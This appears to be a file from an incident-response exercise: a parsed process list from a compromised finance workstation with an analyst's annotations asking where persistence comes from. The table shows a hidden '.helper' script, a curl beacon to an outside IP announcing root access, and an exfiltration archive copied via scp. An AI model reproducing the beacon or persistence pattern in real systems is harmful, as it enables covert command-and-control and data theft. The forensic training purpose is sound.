@@ -1,0 +1,40 @@
+================================================================
+HOST: 10.0.1.87 (workstation, finance-analyst — o.adegoke)
+SNAPSHOT: 2024-06-08 04:12 UTC (Tunde quarantined the box at 04:08)
+TOOL: Volatility 3 — windows.pslist (linux profile)
+NOTE: This is the pre-parsed output. You do not need to install
+Volatility to do the task — just read the table.
+================================================================
+
+PID    PPID   USER         %CPU   %MEM   START         COMMAND
+1      0      root         0.0    0.1    Jun  3 22:00  /sbin/init
+412    1      root         0.0    0.2    Jun  3 22:00  /lib/systemd/systemd-journald
+891    1      root         0.0    0.3    Jun  3 22:00  /usr/sbin/sshd -D
+1003   1      root         0.0    0.5    Jun  3 22:00  /usr/sbin/cron -f
+1102   1      message+     0.0    0.3    Jun  3 22:00  /usr/bin/dbus-daemon --system
+1488   1      root         0.0    0.1    Jun  3 22:00  /lib/systemd/systemd-logind
+1872   891    o.adegoke    0.0    0.4    Jun  4 02:07  sshd: o.adegoke [priv]
+1879   1872   o.adegoke    0.0    0.3    Jun  4 02:07  sshd: o.adegoke@pts/3
+1882   1879   o.adegoke    0.1    0.2    Jun  4 02:07  -bash
+1903   1882   root         0.0    0.1    Jun  4 02:09  /usr/bin/less /var/log/auth.log
+2014   1882   root         0.0    0.2    Jun  4 02:13  /bin/bash -c chmod +x /var/lib/mc/.helper
+2019   1     root          0.4    0.6    Jun  4 02:15  /var/lib/mc/.helper
+2031   2019   root         0.2    0.4    Jun  4 02:15  curl -sfm 10 https://185.220.101.9/beacon -d workstation:root
+2417   1     root          0.0    0.1    Jun  4 02:18  cron
+2502   1     www-data      0.1    0.4    Jun  4 02:32  /usr/sbin/apache2 -k start
+3211   1882   o.adegoke    0.0    0.2    Jun  4 03:01  /usr/bin/scp -t /tmp/exfil.tgz
+4188   1     root          0.0    0.1    Jun  5 03:14  /var/lib/mc/.helper
+4192   4188   root         0.1    0.3    Jun  5 03:14  curl -sfm 10 https://185.220.101.9/beacon -d workstation:root
+4501   1     root          0.0    0.1    Jun  5 03:16  cron
+6042   1     o.adegoke    0.1    0.5    Jun  6 09:01  /usr/bin/firefox-esr
+6210   6042   o.adegoke    0.0    0.4    Jun  6 09:01  /usr/lib/firefox-esr/firefox-esr -contentproc
+
+================================================================
+ANNOTATIONS by Tunde:
+  - The /var/lib/mc/.helper script does not belong to any
+    package known to the host. It survives reboots — it is
+    sourced from a config in o.adegoke's home dir. Find it.
+  - 185.220.101.9 is the same IP that hit /legacy-admin/.
+  - The cron entries at 02:18 and 03:16 do NOT correspond to any
+    /etc/cron.d/* entry on disk. Where are they coming from?
+================================================================
